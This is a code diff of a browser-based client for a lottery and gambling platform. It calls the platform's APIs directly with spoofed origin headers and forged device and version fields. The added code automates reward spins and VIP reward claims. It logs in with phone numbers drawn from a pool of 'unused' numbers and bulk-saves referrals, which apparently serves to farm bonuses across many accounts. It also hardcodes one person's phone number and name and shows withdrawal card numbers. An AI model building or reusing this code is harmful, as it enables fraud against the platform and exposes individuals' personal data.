+      else{ results.push({step:'Spin #2',status:'❌ Failed'}); p.innerHTML+=`<div style="color:#fb7185;">❌ Spin #2 failed</div>`; }
+      await getBalance();
+      p.innerHTML+=`<div style="margin-top:10px;border-top:1px solid rgba(255,255,255,0.02);padding-top:8px;color:#fbbf24;font-weight:700;">📊 Summary</div>`;
+      results.forEach(r=>{ const c=r.status.includes('✅')?'#34d399':'#fb7185'; p.innerHTML+=`<div style="color:${c};">${r.step}: ${r.status}</div>`; });
+      p.innerHTML+=`<div style="color:#a5b4fc;">💰 Balance: ₹${S.balance.toFixed(2)}</div>`;
+      if(results.filter(r=>r.status.includes('✅')).length===3) p.innerHTML+=`<div style="color:#fbbf24;font-weight:700;font-size:14px;margin-top:8px;">🎉 ALL STEPS COMPLETED!</div>`;
+    }catch(e){ p.innerHTML+=`<div style="color:#fb7185;">❌ Error: ${e.message}</div>`; }
+    S.isAutoClaiming=false;
+  }
+
+  async function spinTurntable(bet=10,count=1){
+    if(!S.token) return null;
+    try{
+      const r=await fetch('https://api.bh2255.xyz/app/turntable/order/create',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','token':S.token,'packageid':'2','visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,reqDate:Date.now(),ua:'Mozilla/5.0 (Linux; Android 13)',packageId:2,packageInfo:'com.resulta.checka',versionCode:'999',isDemo:1,count,betAmount:bet})
+      });
+      if(r.status===200){ const d=await r.json(); if(d.code===0) return d; }
+      return null;
+    }catch(_){ return null; }
+  }
+
+  async function claimVipReward(){
+    if(!S.token) return null;
+    try{
+      const r=await fetch('https://api.bh556677wplus.com/app/vip/getVipLevelReward',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','token':S.token,'packageid':'2','visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,reqDate:Date.now(),ua:'Mozilla/5.0',packageId:2,packageInfo:'com.resulta.checka',versionCode:'999',level:1})
+      });
+      if(r.status===200){ const d=await r.json(); if(d.code===0) return d; }
+      return null;
+    }catch(_){ return null; }
+  }
+
+  async function renderTransactions(){
+    S.currentPanel='transactions';
+    showPanel(`<div class="dynamic-card"><div class="title">📋 Transaction History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="text-align:center;padding:20px;color:#6b7280;">Loading...</div></div>`);
+    let all=[];
+    try{
+      const r1=await fetch('https://api.bh2266.xyz/app/user/balance',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','Token':S.token,'Visitor':S.visitor,'PackageId':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',versionCode:'999',pageNo:1,pageSize:20})
+      });
+      if(r1.status===200){ const d=await r1.json(); if(d.code===0){ const list=d.data||[]; for(const t of list){ all.push({type:'deposit',appDate:t.appDate||t.createTime||Date.now(),amount:t.paidAmount||t.price||0,balance:t.balance||0,orderNo:t.orderNo||'',payTypeName:t.payTypeName||'Recharge',channelName:t.channelName||'',status:t.status||'COMPLETE',gameName:t.gameName||'',iconUrl:t.iconUrl||''}); } } }
+    }catch(_){}
+    try{
+      const r2=await fetch('https://api.bh2266.xyz/app/pay/paid/log',{
+        method:'POST',
+        headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','Token':S.token,'Visitor':S.visitor,'PackageId':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',versionCode:'999',pageNo:1,pageSize:20})
+      });
+      if(r2.status===200){ const d=await r2.json(); if(d.code===0){ const list=d.data||[]; for(const t of list){ all.push({type:'withdraw',appDate:t.createTime||Date.now(),amount:t.paidAmount||0,reward:t.reward||0,orderNo:t.orderNo||'',bankName:t.bankName||'',userCardNumber:t.userCardNumber||'',status:t.respCode===2?'COMPLETE':'PENDING',channelName:t.channelName||'SYSTEM'}); } } }
+    }catch(_){}
+    all.sort((a,b)=>(b.appDate||0)-(a.appDate||0));
+    let html=`<div class="dynamic-card"><div class="title">📋 Transaction History (${all.length}) <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;">
+        <button class="btn-sm" id="txnAll" style="flex:1;background:rgba(139,92,246,0.04);color:#a5b4fc;border:1px solid rgba(139,92,246,0.04);">All</button>
+        <button class="btn-sm btn-success" id="txnDeposit" style="flex:1;">Deposits</button>
+        <button class="btn-sm btn-withdraw" id="txnWithdraw" style="flex:1;">Withdrawals</button>
+      </div>
+      <div id="transactionList" style="max-height:350px;overflow-y:auto;font-size:12px;">`;
+    if(!all.length) html+=`<div style="color:#6b7280;text-align:center;padding:20px;">No transactions found</div>`;
+    else{
+      for(const t of all){
+        const date=new Date(t.appDate); const ts=date.toLocaleString();
+        const isDep=t.type==='deposit'; const amt=parseFloat(t.amount||0).toFixed(2); const bal=parseFloat(t.balance||0).toFixed(2);
+        const icon=isDep?'💰':'💸'; const typeLabel=isDep?'Deposit':'Withdraw'; const sc=t.status==='COMPLETE'?'#34d399':'#fbbf24';
+        const displayName=isDep?(t.channelName||t.payTypeName||'Recharge'):(t.bankName||'Bank');
+        html+=`<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,0.01);" data-type="${t.type}">
+          <div style="flex:1;"><div><span>${icon} ${typeLabel}</span><span style="color:#fbbf24;margin-left:8px;font-weight:600;">₹${amt}</span>${t.gameName?`<span style="color:#6b7280;font-size:10px;margin-left:6px;">🎮 ${t.gameName}</span>`:''}</div>
+          <div style="color:#6b7280;font-size:9px;margin-top:2px;">${displayName}${isDep?'':(t.userCardNumber?` · ${t.userCardNumber}`:'')} · ${ts}${!isDep?`<span style="color:#6b7280;margin-left:6px;">Fee: ₹${(t.amount-(t.reward||0)).toFixed(2)}</span>`:''}<span style="color:#6b7280;margin-left:6px;">Bal: ₹${bal}</span></div></div>
+          <div style="text-align:right;"><div style="color:${isDep?'#34d399':'#fb7185'};font-size:10px;font-weight:600;">${isDep?'+':'-'}₹${amt}</div><div style="color:${sc};font-size:9px;">${t.status}</div></div>
+        </div>`;
       }
-      
-      if (state.currentPanel === action && dynamicContent.innerHTML !== '') {
-        closePanel();
-        return;
+    }
+    html+=`</div></div>`;
+    showPanel(html);
+    const filterMap={txnAll:'all',txnDeposit:'deposit',txnWithdraw:'withdraw'};
+    Object.keys(filterMap).forEach(id=>{
+      const btn=document.getElementById(id);
+      if(btn) btn.addEventListener('click',function(){
+        const f=filterMap[id];
+        document.querySelectorAll('#transactionList > div').forEach(el=>{
+          if(f==='all') el.style.display='flex';
+          else el.style.display=(el.dataset.type||'')===f?'flex':'none';
+        });
+      });
+    });
+  }
+
+  async function renderReferral(){
+    S.currentPanel='refer';
+    showPanel(`<div class="dynamic-card"><div class="title">👥 Referral History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="text-align:center;padding:20px;color:#6b7280;">Loading...</div></div>`);
+    const history=await getReferralHistory(1);
+    let html=`<div class="dynamic-card"><div class="title">👥 Referral History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="border-top:1px solid rgba(255,255,255,0.02);padding-top:10px;">
+      <div style="color:#6b7280;font-size:10px;font-weight:600;margin-bottom:6px;">📋 Referral History</div>
+      <div style="max-height:350px;overflow-y:auto;">`;
+    if(history && history.length){
+      const display=history.slice(0,3);
+      for(const ref of display){
+        const d=new Date(ref.createTime); const ts=d.toLocaleString();
+        html+=`<div class="refer-user-item"><div><span class="user-phone">📱 ${ref.inviteUserPhone||'Unknown'}</span><span class="user-time"> · ${ts}</span></div><div><span class="user-status">${ref.status===1?'✅ Active':'⏳ Pending'}</span></div></div>`;
       }
-      
-      document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active-option'));
+    }else html+=`<div style="color:#6b7280;font-size:12px;text-align:center;padding:20px;">No referral history yet</div>`;
+    html+=`</div></div>
+      <div style="margin-top:12px;display:flex;gap:8px;"><button class="btn-sm btn-refer btn-block" id="shareReferralBtn">📤 Share Referral Link</button></div>
+      <div id="shareResult" class="mt-10"></div></div>`;
+    showPanel(html);
+    document.getElementById('shareReferralBtn').addEventListener('click',async function(){
+      try{
+        const r=await fetch('https://api.bh2255.xyz/app/share/getShareInfo',{method:'GET',headers:{'Accept':'application/json, text/plain, */*','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/'}});
+        if(r.status===200){ const d=await r.json(); if(d.code===0){ const sd=d.data||{}; const url=sd.shareUrl||'https://playbhau.com/'; const txt=sd.shareText||'Join Bhau Lottery and win big! 🎰'; const div=document.getElementById('shareResult'); div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Share link ready!</div><div style="font-size:11px;color:#6b7280;word-break:break-all;margin:6px 0;">🔗 ${url}</div><div style="display:flex;gap:6px;margin-top:4px;"><button class="btn-sm btn-primary" onclick="navigator.clipboard.writeText('${url}')" style="padding:6px 14px;font-size:11px;">📋 Copy Link</button><button class="btn-sm btn-warning" onclick="window.open('${url}','_blank')" style="padding:6px 14px;font-size:11px;">🌐 Open</button></div>${txt?`<div style="font-size:10px;color:#6b7280;margin-top:4px;">📝 ${txt}</div>`:''}</div>`; } }
+      }catch(_){}
+    });
+  }
+
+  // ─── LOGOUT / EXIT ──────────────────────────────────────────────────────
+  function doLogout(){
+    S.token=null; S.isLoggedIn=false; S.phone=null; S.balance=0;
+    S.selectedAmount=200; S.selectedPayment=null; S.isAutoClaiming=false;
+    S.depositAmounts=[]; S.paymentMethods=[]; S.withdrawCards=[]; S.cardList=[]; S.selectedCard=null; S.referralHistoryCache=null;
+    clearSession();
+    exitOverlay.classList.remove('active');
+    closePanel();
+    logoutConfirmOverlay.classList.remove('active');
+    loginSection.style.display='block'; dashboard.style.display='none';
+    dynamicContent.innerHTML=''; balanceDisplay.textContent='0.00';
+  }
+
+  function showExitPermission(){ exitOverlay.classList.add('active'); }
+  function hideExitPermission(){ exitOverlay.classList.remove('active'); }
+  function showLogoutConfirmation(){ logoutConfirmOverlay.classList.add('active'); }
+  function hideLogoutConfirmation(){ logoutConfirmOverlay.classList.remove('active'); }
+
+  exitStayBtn.addEventListener('click',()=>{ hideExitPermission(); history.pushState(null,'',window.location.href); });
+  exitLeaveBtn.addEventListener('click',()=>{ hideExitPermission(); window.location.href='about:blank'; });
+  logoutYesBtn.addEventListener('click',()=>{ hideLogoutConfirmation(); doLogout(); });
+  logoutNoBtn.addEventListener('click',hideLogoutConfirmation);
+
+  // ─── LOGIN HANDLER ──────────────────────────────────────────────────────
+  async function handleLogin(e){
+    e.preventDefault();
+    const phone=phoneInput.value.trim();
+    const pass=passwordInput.value.trim();
+    if(phone.length!==10){ showToast('Enter valid 10-digit phone number.','warning'); return; }
+    loginBtn.disabled=true; loginBtn.textContent='⏳ Logging...';
+    const ok=await login(phone,pass);
+    if(ok){
+      loginSection.style.display='none'; dashboard.style.display='block';
+      userPhoneDisplay.textContent=phone;
+      await getBalance();
+      closePanel();
+      await getReferralHistory(1);
+      await updateNumberDisplay();
+      await renderWithdraw();
+      history.pushState(null,'',window.location.href);
+      showToast('Login successful! Welcome back, Soumya!','success');
+    }
+    loginBtn.disabled=false; loginBtn.textContent='🔑  LOGIN & LOAD  →';
+  }
+
+  // ─── AUTOPASTE ──────────────────────────────────────────────────────────
+  autopasteBtn.addEventListener('click',async function(){
+    this.disabled=true;
+    try{
+      const r=await autoLoginAPI('claim');
+      if(!r.number) throw new Error('No unused number available.');
+      phoneInput.value=r.number;
+      phoneInput.dispatchEvent(new Event('input',{bubbles:true}));
+      phoneInput.dispatchEvent(new Event('change',{bubbles:true}));
+      showToast('Number pasted successfully.','success');
+      await updateNumberDisplay();
+    }catch(e){ showToast(e.message||'No unused number available.','warning'); }
+    finally{ this.disabled=false; }
+  });
+
+  // ─── AUTO SAVE REFERRALS ──────────────────────────────────────────────
+  autoSaveReferralsBtn.addEventListener('click',manualAutoSaveReferrals);
+
+  // ─── SAVE NUMBER ──────────────────────────────────────────────────────
+  saveNumberBtn.addEventListener('click',async function(){
+    const phone=saveNumberInput.value.trim();
+    if(!/^[6-9]\d{9}$/.test(phone)){ showToast('Enter valid 10-digit number.','warning'); return; }
+    this.disabled=true;
+    try{
+      await autoLoginAPI('save',{phone});
+      saveNumberInput.value='';
+      showToast('Number saved successfully.','success');
+      await updateNumberDisplay();
+    }catch(e){ showToast(e.message,'error'); }
+    finally{ this.disabled=false; }
+  });
+  saveNumberInput.addEventListener('keydown',e=>{ if(e.key==='Enter') saveNumberBtn.click(); });
+
+  // ─── MENU EVENTS ──────────────────────────────────────────────────────
+  document.querySelectorAll('.menu-item').forEach(item=>{
+    item.addEventListener('click',function(){
+      const action=this.dataset.action;
+      if(action==='logout'){ showLogoutConfirmation(); return; }
+      if(S.currentPanel===action && dynamicContent.innerHTML!==''){ closePanel(); return; }
+      document.querySelectorAll('.menu-item').forEach(i=>i.classList.remove('active-option'));
       this.classList.add('active-option');
-      
-      switch(action) {
+      switch(action){
         case 'deposit': renderDeposit(); break;
         case 'games': renderGames(); break;
         case 'addcard': renderAddCard(); break;
@@ -3131,41 +1782,35 @@
         case 'withdraw': renderWithdraw(); break;
         case 'transactions': renderTransactions(); break;
         case 'refer': renderReferral(); break;
-        default: renderWelcome();
+        default: closePanel();
       }
     });
   });
 
-  // ---- UI EVENTS ----
-  showPassBtn.addEventListener('click', () => {
-    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-    showPassBtn.textContent = passwordInput.type === 'password' ? '◉' : '◉';
+  // ─── UI TOGGLES ──────────────────────────────────────────────────────
+  showPassBtn.addEventListener('click',()=>{
+    passwordInput.type=passwordInput.type==='password'?'text':'password';
+    showPassBtn.textContent=passwordInput.type==='password'?'◉':'◉';
   });
-  document.getElementById('loginForm').addEventListener('submit', handleLogin);
+  document.getElementById('loginForm').addEventListener('submit',handleLogin);
+  phoneInput.addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,10); });
 
-  phoneInput.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '').slice(0, 10);
+  // ─── BACK BUTTON GUARD ──────────────────────────────────────────────
+  history.pushState(null,'',window.location.href);
+  window.addEventListener('popstate',function(e){
+    if(S.isLoggedIn){ closePanel(); showExitPermission(); history.pushState(null,'',window.location.href); }
   });
+  window.addEventListener('beforeunload',function(){ if(S.isLoggedIn) saveSession(); });
 
-  // ---- INIT ----
-  if (!restoreSession()) {
-    updateNumberDisplayFromServer();
+  // ─── RESTORE SESSION ────────────────────────────────────────────────
+  if(loadSession()){
+    loginSection.style.display='none'; dashboard.style.display='block';
+    userPhoneDisplay.textContent=S.phone||'8597630383';
+    updateNumberDisplay();
+    getBalance().then(()=>{ closePanel(); getReferralHistory(1); renderWithdraw(); });
+  }else{
+    updateNumberDisplay();
   }
-  
-  window.addEventListener('popstate', function(e) {
-    if (state.isLoggedIn) {
-      closePanel();
-      showExitPermission();
-      history.pushState(null, '', window.location.href);
-    }
-  });
-
-  window.addEventListener('beforeunload', function() {
-    if (state.isLoggedIn) {
-      saveSession();
-    }
-  });
-
 })();
 </script>
 </body>
